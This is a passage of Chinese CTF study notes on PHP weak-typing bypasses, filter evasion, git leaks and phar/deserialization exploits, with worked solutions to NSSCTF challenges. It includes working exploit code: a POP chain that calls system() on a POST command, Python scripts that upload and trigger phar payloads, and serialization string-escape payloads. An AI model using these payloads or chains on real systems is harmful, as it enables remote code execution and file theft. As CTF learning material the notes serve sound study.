%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab\nor\n​    a&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2\n&amp;b&#x3D;M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\nSha1\narray1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2&#x2F;%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1\n5.md5($a) &#x3D;&#x3D; md5(md5($b)md和md5后都是以0e开头的字符串：\nwSfHENKtYMLp9dlXrjTf&#x3D;&gt;0e831574571239196549417613222648\nDZScqjlajV0mrWZl6YUw&#x3D;&gt;0e328945755880883750704598784448\n4.$a&#x3D;&#x3D;md5($a)10e215962017\n\nphp 弱类型总结md5上文已总结\njson 绕过123456789101112131415&lt;?phpif (isset($_POST[&#x27;message&#x27;])) &#123;    $message = json_decode($_POST[&#x27;message&#x27;]);    $key =&quot;*********&quot;;    if ($message-&gt;key == $key) &#123;        echo &quot;flag&quot;;    &#125;     else &#123;        echo &quot;fail&quot;;    &#125; &#125; else&#123;     echo &quot;~~~~&quot;; &#125;?&gt;\n\n\n分析：输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0&#x3D;&#x3D;”admin”这种形式绕过\n最终payload message&#x3D;{“key”:0}                      \narray_search（） 绕过1234567891011121314151617 1 &lt;?php 2 if(!is_array($_GET[&#x27;test&#x27;]))&#123;exit();&#125; 3 $test=$_GET[&#x27;test&#x27;]; 4 for($i=0;$i&lt;count($test);$i++)&#123; 5     if($test[$i]===&quot;admin&quot;)&#123; 6         echo &quot;error&quot;; 7         exit(); 8     &#125; 9     $test[$i]=intval($test[$i]);10 &#125;11 if(array_search(&quot;admin&quot;,$test)===0)&#123;12     echo &quot;flag&quot;;13 &#125;14 else&#123;15     echo &quot;false&quot;;16 &#125;17 ?&gt;\n\n分析：上面是自己写的一个，先判断传入的是不是数组，\n然后循环遍历数组中的每个值，并且数组中的每个键值不能和admin相等，\n并且将每个值转化为int类型，\n再判断传入的数组是否有“admin”，有则返回flag\npayload\n test&#x3D;[0]\narray_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，则返回匹配该元素所对应的键名。如果没找到，则返回 false\n原因：array_serch()  在判断数组里面有没有 键值与  字符串“admin”相等 的   用的是 &#x3D;&#x3D;  ，根据php弱类型，字符串admin 的值为 0  ，所以构造一个含有0索引位置的键值为0 的数组 test 就可以成功绕过\nstrcmp（）绕过12345678910111 &lt;?php 2     $password=&quot;***************&quot; 3      if(isset($_POST[&#x27;password&#x27;]))&#123; 4  5         if (strcmp($_POST[&#x27;password&#x27;], $password) == 0) &#123; 6             echo &quot;Right!!!login success&quot;;n 7             exit(); 8         &#125; else &#123; 9             echo &quot;Wrong password..&quot;;10         &#125;11 ?&gt;\n\n\n分析：strcmp是比较两个字符串，如果str1&lt;str2 则返回值&lt;0 ，如果str1大于str2返回&gt;0 ，如果两者相等 返回0\n我们是不知道$password的值的，题目要求strcmp判断的接受的值和$password必需相等，strcmp传入的期望类型是字符串类型，如果传入的是个数组会怎么样呢\n我们传入 password[]&#x3D;xxx 可以绕过 是因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等\npayload: password[]&#x3D;xxx\nswitch（）绕过12345678910111213141516171819201 &lt;?php 2 $a=&quot;4admin&quot;; 3 switch ($a) &#123; 4     case 1: 5         echo &quot;fail1&quot;; 6         break; 7     case 2: 8         echo &quot;fail2&quot;; 9         break;10     case 3:11         echo &quot;fail3&quot;;12         break;13     case 4:14         echo &quot;sucess&quot;;  //结果输出success;15         break;16     default:17         echo &quot;failall&quot;;18         break;19 &#125;20 ?&gt;\n\n分析 ： 在进行switch 选择时 $a会被强制转换成整形进行对照所以 令$a&#x3D;”4asdfs” &#x3D;int（4）成功进行绕过\n成也布尔，败也布尔成也布尔，败也布尔‘，布尔类型的true跟任意字符串在‘&#x3D;&#x3D;’下成立\nintval绕过 https://www.nssctf.cn/problem/2076 \n                          \n123通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 intval() 不能用于 object，否则会产生 E_WARNING 错误并返回 1。 echo intval(array());                 // 0echo intval(array(&#x27;foo&#x27;, &#x27;bar&#x27;));     // 1\n\n传入数组就能绕过a[]&#x3D;1 \nlinux rce空格绕过${IFS}&#x2F;$IFS\n \n空格替代 eg:cat &#x2F;1.php &#x3D;&#x3D; cat${IFS}&#x2F;1.php\n&#x3D;的平替like;空格的平替：&#x2F;**&#x2F;, %20, %0a(换行),%a0,(),+;\n8：preg_match绕过 \n1：长度绕过 污染参数，在要传所需参数前传一个无关参数\nEg:所需参数是cmd 传参是可以  a&#x3D;aaaaaaaaaaaaaaaaaaaaaaaaaa**&amp;cmd&#x3D;xxxxxxxx** 标记部分为参数污染部分\n2：[  空格 + . 这四个都可以被处理为**_**\n9：正则绕过及basename()函数 https://www.nssctf.cn/problem/463\n详解 https://www.cnblogs.com/FPointzero/p/16438478.html\n1：basename()：返回路径中的文件名部分。但是它有个小问题，它会去掉文件名\n开头的非 ASCII 值。\n例子： 127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：1.php\n127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;flag.php&#x2F;1.php 显示：1.php\n2：SERVER[′REQUESTURI′]：与 _SERVER[‘PHP_SELF’]的区别是会加上参数\n例子：\n127.0.0.1&#x2F;pikachu&#x2F;index.php?file&#x3D;1.php 显示：&#x2F;pikachu&#x2F;index.php?1.php\n3：$_SERVER[‘PHP_SELF’] ：正在执行脚本的文件名\n例子：\n127.0.0.1&#x2F;pikachu&#x2F;index.php 显示：&#x2F;pikachu&#x2F;index.php\n4：basename()绕过 添加非ascii编码字符 eg：汉字 %a0等\n5：preg_match中show_source绕过 替换成 show[source, show source, show+source, show.source\n10: show_souerce\n在 URL 中使用 show_source 是一种 PHP 提供的特殊功能，用于查看指定文件的源代码。当在 URL 中添加 show_source&#x3D;文件路径时，服务器会返回该文件的源代码而不是执行它。\nMISC蚁剑流量分析特征LitCTF20241.明显的特征为**@ini_set(“display_errors”，”0”);@set_time_limit(0)开头**\n\n2.使用base64或文本转16进制加密的payload\n并且附有混淆随机数，base64中还有混淆字符（前两个），所以需要我们删除流量信息中的前两个字符后才能得到无混淆base64。\neg:\n格式一般为\n&amp;随机数&#x3D;16进制加密数据   上图：\n\n&amp;随机数&#x3D;xx base64加密数据    xx代表两位混淆字符   上图：\n\nzip伪加密 特征Lit2023\n1.压缩源文件数据区 50 4B 03 04 14 00 00 09\n2.压缩源文件目录区 50 4B 01 02 1F 00 14 00 01 \n修改方法\n加粗部分的 01 00 或 09 00  改为 00 00即可\ngit文件泄露Back to the future使用githacker\n1githacker --url http://gz.imxbt.cn:20119/.git --output basectf\n\n在basectf文件夹下可以看到git泄露的文件，进入到目标文件夹下\n1git log #查看git日志\n\n\n\n看到两条信息，可以看到第一条信息是添加什么东西，进而查看第一条信息\n1git checkout 9d85f10e0192ef630e10d7f876a117db41c30417\n\nflag.txt文件恢复\n序列化变量控制和phar反序列化[SWPUCTF 2021 新生赛]babyunser\n1234567891011&lt;?phphighlight_file(__FILE__);error_reporting(0);//read.php$filename=$_POST[&#x27;file&#x27;];if(!isset($filename))&#123;    die();&#125;$file=new zz($filename);$contents=$file-&gt;getFile();\n\n\n\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576&lt;?php//class.phpclass aa&#123;    public $name;    public function __construct()&#123;        $this-&gt;name=&#x27;aa&#x27;;    &#125;    public function __destruct()&#123;        $this-&gt;name=strtolower($this-&gt;name);    &#125;&#125;class ff&#123;    private $content;    public $func;    public function __construct()&#123;        $this-&gt;content=&quot;\\&lt;?php @eval(\\$_POST[1]);?&gt;&quot;;    &#125;    public function __get($key)&#123;        $this-&gt;$key-&gt;&#123;$this-&gt;func&#125;($_POST[&#x27;cmd&#x27;]);    &#125;&#125;class zz&#123;    public $filename;    public $content=&#x27;surprise&#x27;;    public function __construct($filename)&#123;        $this-&gt;filename=$filename;    &#125;    public function filter()&#123;        if(preg_match(&#x27;/^\\/|php:|data|zip|\\.\\.\\//i&#x27;,$this-&gt;filename))&#123;            die(&#x27;这不合理&#x27;);        &#125;    &#125;    public function write($var)&#123;        $filename=$this-&gt;filename;        $lt=$this-&gt;filename-&gt;$var;        //此功能废弃，不想写了    &#125;    public function getFile()&#123;        $this-&gt;filter();        $contents=file_get_contents($this-&gt;filename);        if(!empty($contents))&#123;            return $contents;        &#125;else&#123;            die(&quot;404 not found&quot;);        &#125;    &#125;    public function __toString()&#123;        $this-&gt;&#123;$_POST[&#x27;method&#x27;]&#125;($_POST[&#x27;var&#x27;]);        return $this-&gt;content;    &#125;&#125;class xx&#123;    public $name;    public $arg;    public function __construct()&#123;        $this-&gt;name=&#x27;eval&#x27;;        $this-&gt;arg=&#x27;phpinfo();&#x27;;    &#125;    public function __call($name,$arg)&#123;        $name($arg[0]);    &#125;&#125;\n\n通过读取文件可知是phar反序列化\n看class.php来构造pop\n联系xx和ff触发点：xx中的__call  是链子终点\n利用点：ff中的__get 将func赋值为system\n这里我把这两段代码单独取出来观察\n12345678//xx           public function __get($key)&#123;        $this-&gt;$key-&gt;&#123;$this-&gt;func&#125;($_POST[&#x27;cmd&#x27;]);    &#125;//ff    public function __call($name,$arg)&#123;        $name($arg[0]);    &#125;\n\n想办法将两点连接到一起\n可以看到call中会接受两个参数\n__call($name,$arg)\n而__get中的\n $this-&gt;$key-&gt;&#123;$this-&gt;func&#125;($_POST[&#39;cmd&#39;]);\n如果将key指向ff\n$name &#x3D;&#x3D;&gt; {$this-&gt;func}\n$arg &#x3D;&#x3D;&gt; ($_POST[‘cmd’])\n控制xx类中$key但是xx类中$key也是要通过接受另一个可控的变量值来控制\n123456789101112131415class zz&#123;    public $filename;    public $content=&#x27;surprise&#x27;;    public function write($var)&#123;        $filename=$this-&gt;filename;        $lt=$this-&gt;filename-&gt;$var;           &#125;        public function __toString()&#123;        $this-&gt;&#123;$_POST[&#x27;method&#x27;]&#125;($_POST[&#x27;var&#x27;]);        return $this-&gt;content;    &#125;&#125;\n\n上边代码中的$lt=$this-&gt;filename-&gt;$var;可以触发get\nwrite($var)这又牵扯到了write($var)中的$var,但是这不难\n$this-&gt;&#123;$_POST[&#39;method&#39;]&#125;($_POST[&#39;var&#39;]);\n123payload: POSTmethod=write&amp;var=content\n\n这里要讲一下var为什么赋值成content\n此时\n123456789101112//一步一步向前推，就知道为什么POST为什么这样赋值$this-&gt;&#123;$_POST[&#x27;method&#x27;]&#125;($_POST[&#x27;var&#x27;]); //等价于$this-&gt;write(content)    $lt=$this-&gt;filename-&gt;$var; //等价于$lt=$this-&gt;filename-&gt;content; //将filename指向__get存在的xx类 即$lt=$this-&gt;xx-&gt;content; //而xx中的content是私有属性，触发了get//同时__get($key) //$key接受content 即__get(content) //$key变为可控的值\n\n再次联系xx和ff再回到前边,联系xx和ff，需要将**$key指向ff类**\n即content = new ff;\n但是xx中的content是私有属性\n所以在构造pop是添加一个自定义函数即可\n12345678910class ff&#123;    private $content;    public $func=&#x27;system&#x27;;    public function setWord($content)  //1 xx    &#123;        $this-&gt;content = $content;    &#125;&#125;\n\nexp最后触发__tostring省略，直接上exp\n12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phpclass aa&#123;    public $name; //3 zz&#125;//class.phpclass ff&#123;    private $content;    public $func=&#x27;system&#x27;;    public function setWord($content)  //1 xx    &#123;        $this-&gt;content = $content;    &#125;&#125;class zz&#123;    public $filename; //2 ff    public $content;&#125;class xx&#123;    public $name;    public $arg;&#125;$x=new xx;$z=new zz;$a=new aa;$f=new ff;$f -&gt; setWord($x);$z -&gt; filename = $f;$a -&gt; name = $z;@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀$phar-&gt;startBuffering();  //开始写文件$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub$phar-&gt;setMetadata($a);//写入meta-data$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件$phar-&gt;stopBuffering();?&gt;\n\n12345文件名upload/93ace0ade8d79bd56459f5b2500fd8ee.txtPOST:file=phar://upload/3f4c778782db77d56e8257df926d5685.txt&amp;method=write&amp;var=content&amp;cmd=ls /\n\n\n\n文件包含和序列化综合[ZJCTF 2019]NiZhuanSiWei https://www.nssctf.cn/problem/22 \n12345678910111213141516171819 &lt;?php  $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;    if(preg_match(&quot;/flag/&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  //useless.php        $password = unserialize($password);        echo $password;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;useless.php\nbase64解码\n12345678910111213&lt;?php  class Flag&#123;  //flag.php      public $file;      public function __tostring()&#123;          if(isset($this-&gt;file))&#123;              echo file_get_contents($this-&gt;file);             echo &quot;&lt;br&gt;&quot;;        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);        &#125;      &#125;  &#125;  ?&gt;  \n\n?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}\nphar反序列化和异常抛出绕过prize_p1一个phar文件经过压缩之后，再用phar协议读取打开，也是可以正常执行的\n\n普通phar\ngzip\nbzip2\ntar\nzip\n\n一共就5中可以触发phar操作\n12345678910111213141516171819202122232425262728293031&lt;?phphighlight_file(__FILE__);class getflag &#123;    function __destruct() &#123;        echo getenv(&quot;FLAG&quot;);    &#125;&#125;class A &#123;    public $config;    function __destruct() &#123;        if ($this-&gt;config == &#x27;w&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);            &#125;            file_put_contents(&quot;./tmp/a.txt&quot;, $data);        &#125; else if ($this-&gt;config == &#x27;r&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);            &#125;            echo file_get_contents($data);        &#125;    &#125;&#125;if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $_GET[0])) &#123;    die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);&#125;unserialize($_GET[0]);throw new Error(&quot;那么就从这里开始起航吧&quot;);\n\n代码审计第一部份123456789101112131415161718class A &#123;    public $config;    function __destruct() &#123;        if ($this-&gt;config == &#x27;w&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);            &#125;            file_put_contents(&quot;./tmp/a.txt&quot;, $data);        &#125; else if ($this-&gt;config == &#x27;r&#x27;) &#123;            $data = $_POST[0];            if (preg_match(&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;, $data)) &#123;                die(&quot;我知道你想干吗，我的建议是不要那样做。&quot;);            &#125;            echo file_get_contents($data);        &#125;    &#125;&#125;\n\n这一段可以看见当\nconfig&#x3D;w时是写入.&#x2F;tmp&#x2F;a.txt内容\nconfig&#x3D;r时是读取文件内容\n第二部分12function __destruct()throw new Error(&quot;那么就从这里开始起航吧&quot;);\n\n__destruct和throw new Error的关系\n需要通过CG垃圾回收来绕过\n第三部分12345class getflag &#123;    function __destruct() &#123;        echo getenv(&quot;FLAG&quot;);    &#125;&#125;\n\n可以通过这个getflag类来获取FLAG\n代码审计整理思路得出\n先生成getflag类的phar文件，将phar文件中的序列化字符串进行修改绕过异常抛出\n但是，每一个phar文件都有相应的签名，直接修改会导制文件失效，所以还需要根据修改后的文件来修复签名\n生产phar文件 ph1.phar123456789101112&lt;?phpclass getflag&#123;&#125;$a = new getflag();$a = array(0=&gt;$a,1=&gt;null);$phar = new Phar(&quot;ph1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($a);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;\n\n修改ph1.phar文件中的序列化字符串绕过异常抛出\n将倒数第二个1改为零\n\n修复签名生成可用文件ph2.phar\n123456789from hashlib import sha256with open(&quot;ph1.phar&quot;, &#x27;rb&#x27;) as f:    text = f.read()    main = text[:-40]  # 正文部分(除去最后40字节)    end = text[-8:]  # 最后八位也是不变的    new_sign = sha256(main).digest()    new_phar = main + new_sign + end    open(&quot;ph2.phar&quot;, &#x27;wb&#x27;).write(new_phar)  # 将新生成的内容以二进制方式覆盖写入原来的phar文件\n\n一个phar文件经过压缩之后，再用phar协议读取打开，也是可以正常执行的\n\n普通phar\ngzip\nbzip2\ntar\nzip\n\n一共就5种可以触发phar操作\n上述任意一种方式来进行写入和读取\n压缩绕过1234567891011121314151617181920212223242526272829303132333435import requestsimport gzipimport reurl = &#x27;http://node4.anna.nssctf.cn:28723/&#x27;file = open(&quot;./ph2.phar&quot;, &quot;rb&quot;)  # 打开文件file_out = gzip.open(&quot;./phar.zip&quot;, &quot;wb+&quot;)  # 创建压缩文件对象file_out.writelines(file)file_out.close()file.close()requests.post(    url,    params=&#123;        0: &#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;    &#125;,    data=&#123;        0: open(&#x27;./phar.zip&#x27;, &#x27;rb&#x27;).read()    &#125;)  # 写入res = requests.post(    url,    params=&#123;        0: &#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;    &#125;,    data=&#123;        0: &#x27;phar://tmp/a.txt&#x27;    &#125;)  # 触发res.encoding = &#x27;utf-8&#x27;flag = re.compile(&#x27;(NSSCTF\\&#123;.+?\\&#125;)&#x27;).findall(res.text)[0]print(flag)\n\n数组绕过1234567891011121314151617import requestsimport reurl=&quot;http://node4.anna.nssctf.cn:28853/&quot;### 写入phar文件with open(&quot;ph2.phar&quot;,&#x27;rb&#x27;) as f:    data1=&#123;&#x27;0[]&#x27;:f.read()&#125;          #传数组绕过，值就是hacker1.phar文件的内容    param1 = &#123;0: &#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;&#125;    res1 = requests.post(url=url, params=param1,data=data1)### 读phar文件，获取flagparam2=&#123;0:&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;&#125;data2=&#123;0:&quot;phar://tmp/a.txt&quot;&#125;res2=requests.post(url=url,params=param2,data=data2)flag=re.compile(&#x27;NSSCTF\\&#123;.*?\\&#125;&#x27;).findall(res2.text)print(flag)\n\n\n\n字符串逃逸prize_p5123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;?phperror_reporting(0);class catalogue&#123;    public $class;    public $data;    public function __construct()    &#123;        $this-&gt;class = &quot;error&quot;;        $this-&gt;data = &quot;hacker&quot;;    &#125;    public function __destruct()    &#123;        echo new $this-&gt;class($this-&gt;data);    &#125;&#125;class error&#123;    public function __construct($OTL)    &#123;        $this-&gt;OTL = $OTL;        echo (&quot;hello &quot;.$this-&gt;OTL);    &#125;&#125;class escape&#123;    public $name = &#x27;OTL&#x27;;    public $phone = &#x27;123666&#x27;;    public $email = &#x27;sweet@OTL.com&#x27;;&#125;function abscond($string) &#123;    $filter = array(&#x27;NSS&#x27;, &#x27;CTF&#x27;, &#x27;OTL_QAQ&#x27;, &#x27;hello&#x27;);    $filter = &#x27;/&#x27; . implode(&#x27;|&#x27;, $filter) . &#x27;/i&#x27;;    return preg_replace($filter, &#x27;hacker&#x27;, $string);&#125;if(isset($_GET[&#x27;cata&#x27;]))&#123;    if(!preg_match(&#x27;/object/i&#x27;,$_GET[&#x27;cata&#x27;]))&#123;        unserialize($_GET[&#x27;cata&#x27;]);    &#125;    else&#123;        $cc = new catalogue();        unserialize(serialize($cc));    &#125;    if(isset($_POST[&#x27;name&#x27;])&amp;&amp;isset($_POST[&#x27;phone&#x27;])&amp;&amp;isset($_POST[&#x27;email&#x27;]))&#123;        if (preg_match(&quot;/flag/i&quot;,$_POST[&#x27;email&#x27;]))&#123;            die(&quot;nonono,you can not do that!&quot;);        &#125;        $abscond = new escape();        $abscond-&gt;name = $_POST[&#x27;name&#x27;];        $abscond-&gt;phone = $_POST[&#x27;phone&#x27;];        $abscond-&gt;email = $_POST[&#x27;email&#x27;];        $abscond = serialize($abscond);        $escape = get_object_vars(unserialize(abscond($abscond)));        if(is_array($escape[&#x27;phone&#x27;]))&#123;            echo base64_encode(file_get_contents($escape[&#x27;email&#x27;]));        &#125;        else&#123;            echo &quot;I&#x27;m sorry to tell you that you are wrong&quot;;        &#125;    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt; \n\n解法一序列化字符串逃逸1echo base64_encode(file_get_contents($escape[&#x27;email&#x27;]));\n\n可以知道是让email的值为flag文件\n1if (preg_match(&quot;/flag/i&quot;,$_POST[&#x27;email&#x27;]))\n\n需要绕过正则判断\n1234function abscond($string) &#123;    $filter = array(&#x27;NSS&#x27;, &#x27;CTF&#x27;, &#x27;OTL_QAQ&#x27;, &#x27;hello&#x27;);    $filter = &#x27;/&#x27; . implode(&#x27;|&#x27;, $filter) . &#x27;/i&#x27;;    return preg_replace($filter, &#x27;hacker&#x27;, $string);\n\n看到这里的时候就知道是字符串逃逸了，这里我选择了字符串增多逃逸\n123456789101112&lt;?phpclass escape&#123;    public $name = &#x27;OTL&#x27;;    public $phone = [&#x27;123&#x27;, &#x27;666&#x27;];  // 改为数组    public $email = &#x27;/flag&#x27;;&#125;$es = new escape();echo serialize($es);?&gt;//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:3:&quot;OTL&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;\n\n&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;是目标字符串长度73\n12a=&#x27;hello&#x27;print(a*73)\n\npayload\n12345GET:?cata=1POST:name=hellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohellohello&quot;;s:5:&quot;phone&quot;;a:2:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;666&quot;;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;&amp;phone[]=1&amp;email=1\n\n这种解法与class catalogue关系不大所以cata随便赋值即可\n解法二通过php原生类来读取文件12345678910111213class catalogue&#123;    public $class;    public $data;    public function __construct()    &#123;        $this-&gt;class = &quot;error&quot;;        $this-&gt;data = &quot;hacker&quot;;    &#125;    public function __destruct()    &#123;        echo new $this-&gt;class($this-&gt;data);    &#125;&#125;\n\n12345678if(isset($_GET[&#x27;cata&#x27;]))&#123;    if(!preg_match(&#x27;/object/i&#x27;,$_GET[&#x27;cata&#x27;]))&#123;        unserialize($_GET[&#x27;cata&#x27;]);    &#125;    else&#123;        $cc = new catalogue();        unserialize(serialize($cc));    &#125;\n\n主要用到这两部分\necho new $this-&gt;class($this-&gt;data);\n看到这里就可以知道将\n12345678910111213&lt;?phpclass catalogue &#123;public $class = &#x27;FilesystemIterator&#x27;;public $data = &#x27;glob:///f*&#x27;;public function __toString() &#123;return &quot;Class: &quot; . $this-&gt;class . &quot;, Data: &quot; . $this-&gt;data;&#125;&#125;$ca = new catalogue();echo serialize($ca); // O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;data&quot;;s:10:&quot;glob:///f*&quot;;&#125;\n\n通过这个查看文件名，看到flag\n在通过SplFileObject读取文件内容O:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;\n由于!preg_match(&#39;/object/i&#39;）\n手动改链子\n在序列化链子中 S可以识别16进制字符，可以通过这种方式修改链子\n\nO:9:&quot;catalogue&quot;:2:&#123;s:5:&quot;class&quot;;S:13:&quot;SplFileO\\62ject&quot;;s:4:&quot;data&quot;;s:5:&quot;/flag&quot;;&#125;\n\n\\62是b的ascii形式 \n\n直接读取flag\n异常抛出绕过ezpophttps://developer.aliyun.com/article/1161068\nhttps://blog.csdn.net/qq_45619909/article/details/122803600\nGC（垃圾回收）在PHP中，使用引用计数和回收周期来自动管理内存对象的，当一个变量被设置为NULL，或者没有任何指针指向\n时，它就会被变成垃圾，被GC机制自动回收掉\nzval的变量容器\n\n12345678&lt;?php$a=&quot;new string&quot;;$b =&amp;$a;$c 